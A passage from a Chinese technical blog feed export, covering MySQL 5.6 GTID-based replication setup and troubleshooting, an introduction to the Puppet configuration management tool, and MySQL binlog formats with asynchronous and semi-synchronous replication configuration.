class="line">   Master_Retry_Count: 86400</div><div class="line">  Master_Bind:</div><div class="line">  Last_IO_Error_Timestamp:</div><div class="line"> Last_SQL_Error_Timestamp:</div><div class="line">   Master_SSL_Crl:</div><div class="line">   Master_SSL_Crlpath:</div><div class="line">   Retrieved_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:76793-77026</div><div class="line">Executed_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-77025</div><div class="line">Auto_Position: 1</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>注：</strong><br>两个Yes代表复制正常<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes</p>
<p>基于GTID复制的新特性：<br>Retrieved_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:76793-77026<br>Executed_Gtid_Set: 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-77025</p>
<p>Retrieved_Gtid_Set项：记录了relay日志从Master获取了binlog日志的位置<br>Executed_Gtid_Set项：记录本机执行的binlog日志位置（如果是从机，包括Master的binlog日志位置和slave本身的binlog日志位置）</p>
<h4 id="四、基于GTID复制增加新的slav"><a href="#四、基于GTID复制增加新的slav" class="headerlink" title="四、基于GTID复制增加新的slav"></a>四、基于GTID复制增加新的slav</h4><p>备份主MySQL数据，记录主gtid_executed—&gt;将备份数据恢复到从数据目录—&gt;设置从gtid_purged的值为主的gtid_executed值—&gt;启动复制即可</p>
<ol>
<li>使用mysqldump备份主数据<br>mysqldump —all-databases —single-transaction —triggers —routines —host=127.0.0.1 —port=3306 —user=root —password=geekwolf &gt; backup.sql<br>亦可以使用xtrabackup也支持GTID：<br>请参考:<a href="http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/" target="_blank" rel="external">http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/</a></li>
<li>传到从MySQL，恢复数据<br>由于新版本msqldump会记录并设置GTID_PURGED的值等于主的GTID_EXECUTED，所以只需要将sql导入到从库即可</li>
<li>启动主从复制</li>
</ol>
<p>从库执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql &gt; CHANGE MASTER TO MASTER_HOST=&apos;127.0.0.1&apos;, MASTER_USER=&apos;root&apos;, MASTER_PASSWORD=geekwolf&apos;, MASTER_PORT=3306, MASTER_AUTO_POSITION = 1;</div><div class="line">mysql &gt; START SLAVE;</div></pre></td></tr></table></figure></p>
<h4 id="五、基于GTID复制出错的解决办法"><a href="#五、基于GTID复制出错的解决办法" class="headerlink" title="五、基于GTID复制出错的解决办法"></a>五、基于GTID复制出错的解决办法</h4><p><strong>问题:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Slave_IO_Running: No</div><div class="line">Slave_SQL_Running: Yes</div><div class="line">Last_IO_Error: Got fatal error 1236 from master when reading data from binary log: &apos;The slave is connecting using CHANGE MASTER TO MASTER_AUTO_POSITION = 1, but the master has purged binary logs containing GTIDs that the slave requires.&apos;</div></pre></td></tr></table></figure></p>
<p><strong>解决思路:</strong></p>
<p>从复制跳过已经丢失的binlog，继续复制或者重新做主从（可以参考上面的操作）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">主MySQL：</div><div class="line">mysql&gt; show global variables like &apos;%gtid_executed%&apos;;</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">| Variable_name | Value |</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">| gtid_executed | 21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937 |</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">从MySQL：</div><div class="line">mysql&gt; set global GTID_PURGED=&quot;21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937&quot;;</div><div class="line">ERROR 1840 (HY000): @@GLOBAL.GTID_PURGED can only be set when @@GLOBAL.GTID_EXECUTED is empty.</div><div class="line"></div><div class="line">mysql&gt; reset master;</div><div class="line">Query OK, 0 rows affected (0.19 sec)</div><div class="line">mysql&gt; show global variables like &apos;GTID_EXECUTED&apos;;</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">| Variable_name | Value |</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">| gtid_executed |  |</div><div class="line">+---------------+-----------------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; stop slave;</div><div class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; set global GTID_PURGED=&quot;21ad8db5-f038-11e3-a14a-0200c0a80ad8:1-223937&quot;;</div><div class="line">Query OK, 0 rows affected (0.13 sec)</div><div class="line"></div><div class="line">mysql&gt; start slave;</div><div class="line">Query OK, 0 rows affected (0.04 sec)</div><div class="line"></div><div class="line">mysql&gt; show slave status\G</div><div class="line">[...]</div><div class="line">Slave_IO_Running: Yes</div><div class="line">Slave_SQL_Running: Yes</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p><strong>注意事项：
</strong>使用基于GTID复制时，不需要再关心master_log_file和master_log_os，替代的是只需要知道master上的GTID，并且配置在从上即可；<br>记录GTID的有两个全局变量：gtid_executed和gtid_purged<br><strong>与GTID复制相关的参数：</strong><br><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/gtid1.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/gtid1.png" alt="gtid"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GTID_EXECUTED ：表示已经在该实例上执行过的事务；执行RESET MASTER可以置空该参数；也可以设置GTID_NEXT执行一个空事务来影响GTID_EXECUTED</div><div class="line">GTID_NEXT ：是SESSION级别参数，表示下一个事务被执行使用的GTID（show variables like ‘gtid_%’;）</div><div class="line">GTID_PURGED ：表示被删除的binlog事务GTID，它是GTID_EXCUTED的子集，MySQL5.6.9，该参数无法被设置</div><div class="line">GTID_OWENED ：表示正在执行的事务的GTID以及对应的线程ID</div><div class="line"></div><div class="line">如果设置MASTER_AUTO_POSITION = 1表示主从复制连接使用基于GTID的方式复制</div><div class="line">CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_AUTO_POSITION=1;</div></pre></td></tr></table></figure></p>
<p>如果在GTID复制模式下想要使用基于文件的复制协议需要MASTER_AUTO_POSITION=0（至少指定其中MASTER_LOG_FILE、MASTER_LOG_POSITION一个）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_LOG_FILE=&apos;mysql-bin.000002&apos;,MASTER_LOG_POS=120,MASTER_AUTO_POSITION=0;</div></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="http://dev.mysql.com/doc/refman/5.6/en/replication-gtids-restrictions.html" target="_blank" rel="external">MYSQL 5.6 GTID-based Replication</a><br><a href="http://www.woqutech.com/?p=1108" target="_blank" rel="external">MYSQL 5.6 GTID模式下手工删除日志导致备库数据丢失</a><br><a href="http://www.mysqlperformanceblog.com/2013/05/09/how-to-create-a-new-or-repair-a-broken-gtid-based-slave-with-percona-xtrabackup/" target="_blank" rel="external">How to create a new (or repair a broken) GTID based slave with Percona XtraBackup</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gitd </tag>
            
            <tag> 主从复制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[初认识Puppet]]></title>
      <url>/2014/08/20/first-puppet.html</url>
      <content type="html"><![CDATA[<h4 id="自动化运维都有哪些开源软件"><a href="#自动化运维都有哪些开源软件" class="headerlink" title="自动化运维都有哪些开源软件"></a>自动化运维都有哪些开源软件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">初始化：Kickstart、Cobbler、 Rpmbuild/Xen、Kvm、Lxc、Docker/Openstack、Cloudstack、Opennebula、Eucalyplus</div><div class="line">配置类工具：Chef、Puppet、Func、Cfengine</div><div class="line">命令和控制类工具: Fabric、Salstack、Ansible、Capistrano、Pssh、Dsh、Expect</div><div class="line">监控类工具：Cacti、Nagios、Zabbix、Ganglia</div></pre></td></tr></table></figure>
<h4 id="什么是Puppet"><a href="#什么是Puppet" class="headerlink" title="什么是Puppet"></a>什么是Puppet</h4><p>puppet是一种Linux、Unix平台的集中配置管理系统，使用ruby语言，可管理配置文件、用户、cron任务、软件包、系统服务等。puppet把这些系统实体称之为资源，puppet的设计目标是简化对这些资源的管理以及妥善处理资源间的依赖关系</p>
<h4 id="Puppet都有哪些特性"><a href="#Puppet都有哪些特性" class="headerlink" title="Puppet都有哪些特性"></a>Puppet都有哪些特性</h4><ul>
<li>可自动化重复任务、快速部署关键性应用及本地或者云端完成主动管理变更和快速扩展架构规模等</li>
<li>遵循GPL协议，基于ruby开发，2.7.0以后使用Apache 2.0 License</li>
<li>对于sa来讲是抽象的，只依赖于ruby与facter</li>
<li>基于C/S架构，配置master和agent</li>
<li>默认agent每30分钟连接到puppet master</li>
<li>能管理多达40多种资源，如：file、user 、group、host、packeage、service、cron、exec、yumrepo等，适合整个软件生命周期的管理</li>
</ul>
<h4 id="puppet的整个生命周期"><a href="#puppet的整个生命周期" class="headerlink" title="puppet的整个生命周期"></a>puppet的整个生命周期</h4><p>供应（provisioning:包安装）—&gt;配置（configuration）—&gt;联动(orchestration)—&gt;报告(reporting)</p>
<h4 id="Puppet适用于哪些场合"><a href="#Puppet适用于哪些场合" class="headerlink" title="Puppet适用于哪些场合"></a>Puppet适用于哪些场合</h4><ul>
<li>初始化配置、修复、升级、审计</li>
<li>统一安装、配置管理软件</li>
<li>统一配置系统优化参数</li>
<li>定期检测服务是否运行</li>
<li>快速替换集群时设备的角色</li>
</ul>
<h4 id="Puppet社区版和企业版本功能上有什么差别"><a href="#Puppet社区版和企业版本功能上有什么差别" class="headerlink" title="Puppet社区版和企业版本功能上有什么差别"></a>Puppet社区版和企业版本功能上有什么差别</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/cb.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/cb.png" alt="cb"></a></p>
<p>请参考：<a href="http://puppetlabs.com/puppet/enterprise-vs-open-source" target="_blank" rel="external">http://puppetlabs.com/puppet/enterprise-vs-open-source</a></p>
<h4 id="Puppet支持哪些系统"><a href="#Puppet支持哪些系统" class="headerlink" title="Puppet支持哪些系统"></a>Puppet支持哪些系统</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/zcos.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/zcos.png" alt="zcos"></a></p>
<h4 id="Puppet架构是怎样的"><a href="#Puppet架构是怎样的" class="headerlink" title="Puppet架构是怎样的"></a>Puppet架构是怎样的</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/ppjg.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/ppjg.png" alt="ppjg"></a></p>
<h4 id="Puppet如何工作的"><a href="#Puppet如何工作的" class="headerlink" title="Puppet如何工作的"></a>Puppet如何工作的</h4><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/yl.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/yl.png" alt="yl"></a></p>
<p>  所有配置信息为实现其通用性，在master端通常被定义为modules—class—resource（管理和被管理的对象）<br>资源组成类，类封装成模块<br>puppet只定义目标状态，不用关心实现过程；<br>module(class(resource))—&gt;node ‘FQDN’ {class1,class2}—&gt;agent(facter)报告facter给master —&gt;master根据facter信息生成相应的catalog结果—&gt;agent 应用catalog</p>
<h5 id="流程简述"><a href="#流程简述" class="headerlink" title="流程简述"></a>流程简述</h5><ol>
<li>客户端puppetd向master发起认证请求。</li>
<li>Puppet Master告诉client是合法的。</li>
<li>客户端puppetd开始调用facter，facter可以探测出主机的一些变量，例如主机名，内存大小，IP地址等。pupppetd 把这些信息通过ssl连接发送到服务器端。</li>
<li>服务器端的puppet Master 检测客户端的主机名，然后找到manifest里面对应的node配置， 并对该部分内容进行解析，解析分为几个阶段，语法检查，如果语法错误就报错。如果语法没错，就继续解析，解析的结果会生成一个中间的“伪代码”(catalog)，然后把伪代码发给客户端。</li>
<li>客户端接收到“伪代码”，并且执行。</li>
<li>客户端在执行时判断有没有file文件，如果有就向Fileserver发起请求。</li>
<li>客户端继续判断有没有配置Report。如果配置，就把执行结果发送给服务器。</li>
<li>服务器端把客户端的执行结果写入日志。并可以发送给报告系统(DashBoard)</li>
</ol>
<h4 id="Puppet组织结构是怎样的"><a href="#Puppet组织结构是怎样的" class="headerlink" title="Puppet组织结构是怎样的"></a>Puppet组织结构是怎样的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Puppet的目录结构描述如下： </div><div class="line">|— puppet.conf # 主配置配置文件</div><div class="line">|— fileserver.conf #文件服务器配置文件</div><div class="line">|— auth.conf #认证配置文件 (只允许域内认证)</div><div class="line">|— autosign.conf #自动验证配置文件</div><div class="line">|— tagmail.conf # 邮件配置文件（将错误信息发送）</div><div class="line">|— manifests # 文件存储目录(puppet会先读取该目录的.pp文件site.pp)</div><div class="line">|— nodes</div><div class="line">| | | puppetclient.pp #puppet解析主配置文件所有的模块和节点都在此文件里include</div><div class="line">| |— site.pp # 定义puppet相关的变量和默认配置</div><div class="line">| |— modules.pp # 加载class类模块文件（include nginx）</div><div class="line">|— modules # 定义模块</div><div class="line">| —nginx # 以nginx为例</div><div class="line">| |— file</div><div class="line">| |— manifests</div><div class="line">| | |— init.pp #类的定义，类名必须与模块名相同</div><div class="line">| |—– templates # 模块配置目录，可以被模块的manifests引用</div><div class="line">| | |— nginx.erb #erb模板</div></pre></td></tr></table></figure>
<h4 id="学习Puppet去哪里"><a href="#学习Puppet去哪里" class="headerlink" title="学习Puppet去哪里"></a>学习Puppet去哪里</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Puppet相关文档：[http://docs.puppetlabs.com/](http://docs.puppetlabs.com/)</div><div class="line">常用模块下载地址： [https://forge.puppetlabs.com/](https://forge.puppetlabs.com/)</div><div class="line">PuppetDashboard下载地址：[https://downloads.puppetlabs.com/dashboard/](https://downloads.puppetlabs.com/dashboard/)</div><div class="line">PuppetDashboard帮助文档：[http://docs.puppetlabs.com/dashboard/](http://docs.puppetlabs.com/dashboard/)</div><div class="line">Puppet中文wiki：[http://puppet.wikidot.com/](http://puppet.wikidot.com/)</div><div class="line">Puppet中文论坛：[http://www.puppetfans.com/](http://www.puppetfans.com/)</div><div class="line">Puppet运维自动化文档：[http://pan.baidu.com/s/1c0hBMgg](http://pan.baidu.com/s/1c0hBMgg)</div><div class="line">Puppet简单安装可以参考：[http://www.chenshake.com/puppet-study-notes/#i-3](http://www.chenshake.com/puppet-study-notes/#i-3)</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> puppet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL复制原理与配置]]></title>
      <url>/2014/08/20/mysql-rep.html</url>
      <content type="html"><![CDATA[<h5 id="一、Mysql复制基本原理"><a href="#一、Mysql复制基本原理" class="headerlink" title="一、Mysql复制基本原理"></a>一、Mysql复制基本原理</h5><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/fzyl.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/fzyl.png" alt="fzyl"></a></p>
<ol>
<li>Mysql主库在事务提交时会将数据变更作为Events记录在Binlog中，Mysql主库的sync_binlog参数(默认值为0<br>可参考<a href="http://dev.mysql.com/doc/refman/5.6/en/replication-options-binary-log.html#sysvar_sync_binlog" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.6/en/replication-options-binary-log.html#sysvar_sync_binlog</a>)控制Binlog日志刷新到磁盘</li>
<li>主库推送Binlog中的事件到从库的Relay Log，之后从库根据Relay Log重做DML操作</li>
<li>Mysql通过3个线程完成主从复制：Binlog Dump线程跑在主库，I/O线程和SQL线程跑在从库；<br>当从库启动复制，首先创建I/O线程连接到主库，主库随后创建Binlog Dump线程读取数据库事件并发给I/O线程，I/O线程获取到事件数据后更新到从库的Relay Log中去，之后从库上的SQL线程读取Relay Log中更新的数据库事件并应用</li>
</ol>
<p><strong>注释：</strong><br>从库上两个重要文件：<code>master.info</code>：记录I/O线程连接主库的一些参数；<code>relay-log.info</code>：记录SQL线程应用Relay Log的一些参数</p>
<h5 id="二、Mysql复制中Binlog的三种格式"><a href="#二、Mysql复制中Binlog的三种格式" class="headerlink" title="二、Mysql复制中Binlog的三种格式"></a>二、Mysql复制中Binlog的三种格式</h5><h6 id="三种格式的介绍"><a href="#三种格式的介绍" class="headerlink" title="三种格式的介绍"></a>三种格式的介绍</h6><p><strong>Statement (statement-based replication:SBR)：</strong>基于SQL语句级别的Binlog，每条修改数据的SQL都会保存在Binlog里面；<br><strong>Row(RBR)：</strong>基于行级别，记录每一行数据的变化，也就是将每行数据的变化都记录到Binlog里面，记录得非常详细，单并不记录原始SQL；在复制过程，并不会因为存储过程或者触发器造成主从数据不一致问题，但记录的binlog大小会比Statement格式大很多,CREATE、DROP、ALTER操作只记录原始SQL，而不会记录每行数据的变化到Binlog；<br><strong>Mixed(MBR):</strong>混合Statement和Row模式，默认是Statement模式记录，某些情况下会切换到Row模式，例如SQL中包含与时间、用户相关的函数等statement无法完成主从复制的操作；</p>
<h6 id="Binlog格式的优缺点"><a href="#Binlog格式的优缺点" class="headerlink" title="Binlog格式的优缺点"></a>Binlog格式的优缺点</h6><p><strong>基于Statement复制(Mysql5.5默认格式):</strong><br><strong>优点：</strong><br>Binlog日志量少，节约IO，和减少了主从网络binlog传输量<br>只记录在master上所执行的语句的细节，以及执行语句的上下文信息<br>同时，审计数据库变的更容易</p>
<p><strong>缺点：</strong><br>由于此格式是记录原始执行的SQL，保证能在slave上正确执行必须记录每条语句的上下文信息<br>部分修改数据库时使用的函数可能出现无法复制：sleep()、last_insert_id()、 load_file()、uuid()、user()、found_rows()、sysdate()(除非启动时—sysdate-is-now=true)<br>可能会导致触发器或者存储过程复制导致数据不一致，如调用NOW()函数<br>INSERT…SELECT 可能会产生比RBR更多的行级锁，例如没有order by的insert…select<br>复制需要执行全表扫描(WHERE中没有使用索引)的UPDATE时，需比row请求更多的行级锁<br>对于AUTO_INCREMENT字段的InnoDB引擎表，INSERT会阻塞其他INSERT语句</p>
<p><strong>注：</strong>如果statement不能保证主从正常复制,error日志会有提示：Statement may not be safe to log in statement format</p>
<p><strong>基于Row复制:</strong><br><strong>优点：</strong><br>只记录每一行数据变化的细节，不需要记录上下文信息<br>不会出现某些情况下auto_increment columns,timestamps,.triger、function、procedure无法正常复制的问题<br>新的row格式已经有了优化， CREATE、DROP、ALTER操作只记录原始SQL，而不会记录每行数据的变化到Binlog<br>适用于主从复制要求强一致性的环境</p>
<p><strong>缺点：</strong><br>update、delete、load data local infile等频繁更新或者删除大量行时会产生大量的binlog日志，会有一定的I/O压力，主从同步产生不必要的流量<br>如：UPDATE products set status=‘sold’ where product_id BETWEEN 30000 and 50000;<br>无法很好的进行数据库审计</p>
<h6 id="Binlog基本配置"><a href="#Binlog基本配置" class="headerlink" title="Binlog基本配置"></a>Binlog基本配置</h6><p>修改配置文件my.cnf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">binlog_format=row                               binlog日志格式 </div><div class="line">max_binlog_size = 512M                          每个日志文件大小</div><div class="line">binlog_cache_size=1M                            二进制日志缓冲大小,uncommitted事务产生的日志写在cache，committed的持久化到磁盘binlog里面，此参数不是全局的，是针对session的</div><div class="line">expire_logs_days = 3                            binlog有效期</div><div class="line">log-bin=/datas/mysql/logs/mysql-bin             binlog日志目录</div><div class="line">relay-log=/datas/mysql/logs/relay-bin           从库中继日志目录</div><div class="line">#slave_skip_errors = all</div></pre></td></tr></table></figure></p>
<h5 id="三、Mysql常见两种复制方式"><a href="#三、Mysql常见两种复制方式" class="headerlink" title="三、Mysql常见两种复制方式"></a>三、Mysql常见两种复制方式</h5><h6 id="异步复制（Asynchronous-Replication）"><a href="#异步复制（Asynchronous-Replication）" class="headerlink" title="异步复制（Asynchronous Replication）"></a>异步复制（Asynchronous Replication）</h6><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/ybfz.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/ybfz.png" alt="ybfz"></a><br>主库执行完Commit后，在主库写入Binlog日志后即可成功返回客户端，无需等等Binlog日志传送给从库</p>
<p><strong>异步复制主从配置：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">主 : 192.168.10.216</div><div class="line">从 : 192.168.10.217</div></pre></td></tr></table></figure></p>
<p><strong>步骤：</strong>主从版本一致—&gt;主库授权复制帐号—&gt;确保开启binlog及主从server_id唯一—&gt;主库只读，记录主binlog名称及偏移量—&gt;拷贝主数据文件到从相应位置—&gt;从库change master to —&gt;slave start—&gt;检查两个yes</p>
<p><strong>1.主MySQL配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt;GRANT REPLICATION SLAVE ON *.* TO &apos;rep&apos;@&apos;192.168.10.217&apos;  IDENTIFIED BY  &apos;geekwolf&apos;;</div><div class="line">mysql&gt;FLUSH TABLES WITH READ LOCK;</div><div class="line">mysql&gt; SHOW MASTER STATUS;</div><div class="line">+------------------+----------+--------------+------------------+-------------------+</div><div class="line">| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</div><div class="line">+------------------+----------+--------------+------------------+-------------------+</div><div class="line">| mysql-bin.000003 | 120 | | | |</div><div class="line">+------------------+----------+--------------+------------------+-------------------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">将主库数据文件拷贝到从库对应目录</div><div class="line">mysql&gt;UNLOCK TABLES;</div></pre></td></tr></table></figure></p>
<p><strong>2.从MySQL配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">mysql&gt;CHANGE MASTER TO MASTER_HOST=&apos;192.168.10.216&apos;,MASTER_USER=&apos;rep&apos;,MASTER_PASSWORD=&apos;geekwolf&apos;,MASTER_LOG_FILE=&apos;mysql-bin.000003&apos;,MASTER_LOG_POS=120;</div><div class="line">mysql&gt;START  SLAVE;</div><div class="line">mysql&gt; SHOW SLAVE STATUS \G;</div><div class="line">*************************** 1\. row ***************************</div><div class="line">   Slave_IO_State: Waiting for master to send event</div><div class="line">  Master_Host: 192.168.10.216</div><div class="line">  Master_User: rep</div><div class="line">  Master_Port: 3306</div><div class="line">Connect_Retry: 1</div><div class="line">  Master_Log_File: mysql-bin.000003</div><div class="line">  Read_Master_Log_Pos: 120</div><div class="line">   Relay_Log_File: relay-bin.000002</div><div class="line">Relay_Log_Pos: 283</div><div class="line">Relay_Master_Log_File: mysql-bin.000003</div><div class="line"> Slave_IO_Running: Yes</div><div class="line">Slave_SQL_Running: Yes</div><div class="line">  Replicate_Do_DB:</div><div class="line">  Replicate_Ignore_DB:</div><div class="line">   Replicate_Do_Table:</div><div class="line">   Replicate_Ignore_Table:</div><div class="line">  Replicate_Wild_Do_Table:</div><div class="line">  Replicate_Wild_Ignore_Table:</div><div class="line">   Last_Errno: 0</div><div class="line">   Last_Error:</div><div class="line"> Skip_Counter: 0</div><div class="line">  Exec_Master_Log_Pos: 120</div><div class="line">  Relay_Log_Space: 450</div><div class="line">  Until_Condition: None</div><div class="line">   Until_Log_File:</div><div class="line">Until_Log_Pos: 0</div><div class="line">   Master_SSL_Allowed: No</div><div class="line">   Master_SSL_CA_File:</div><div class="line">   Master_SSL_CA_Path:</div><div class="line">  Master_SSL_Cert:</div><div class="line">Master_SSL_Cipher:</div><div class="line">   Master_SSL_Key:</div><div class="line">Seconds_Behind_Master: 0</div><div class="line">Master_SSL_Verify_Server_Cert: No</div><div class="line">Last_IO_Errno: 0</div><div class="line">Last_IO_Error:</div><div class="line">   Last_SQL_Errno: 0</div><div class="line">   Last_SQL_Error:</div><div class="line">  Replicate_Ignore_Server_Ids:</div><div class="line"> Master_Server_Id: 216</div><div class="line">  Master_UUID: bd2a4c6b-d954-11e3-8c0a-0200c0a80ad8</div><div class="line"> Master_Info_File: /usr/local/mysql/data/master.info</div><div class="line">SQL_Delay: 0</div><div class="line">  SQL_Remaining_Delay: NULL</div><div class="line">  Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to update it</div><div class="line">   Master_Retry_Count: 86400</div><div class="line">  Master_Bind:</div><div class="line">  Last_IO_Error_Timestamp:</div><div class="line"> Last_SQL_Error_Timestamp:</div><div class="line">   Master_SSL_Crl:</div><div class="line">   Master_SSL_Crlpath:</div><div class="line">   Retrieved_Gtid_Set:</div><div class="line">Executed_Gtid_Set:</div><div class="line">Auto_Position: 0</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p><strong>注:</strong> 异步复制中只要binlog不丢失即可保证数据的完整性；当主宕机，从库未收到binlog时，就会丢失数据（主磁盘正常时可以提取差异binlog在从执行），此时就需要用到半同步复制方式</p>
<h6 id="半同步复制-Semi-synchroous-Replicaion"><a href="#半同步复制-Semi-synchroous-Replicaion" class="headerlink" title="半同步复制(Semi-synchroous Replicaion)"></a>半同步复制(Semi-synchroous Replicaion)</h6><p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/btb.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/btb.png" alt="btb"></a></p>
<p>  主库每次事务成功提交时并不及时反馈给前端，而是等待其中一个从库也接收到Binlog事务并成功写入Relay Log之后，才返回Commit操作成功给客户端；如此半同步就保证了事务成功提交后，至少有两份日志记录，一份在主库Binlog上，另一份在从库的Relay Log上，从而进一步保证数据完整性；半同步复制很大程度取决于主从网络RTT（往返时延）；以插件形式存在，</p>
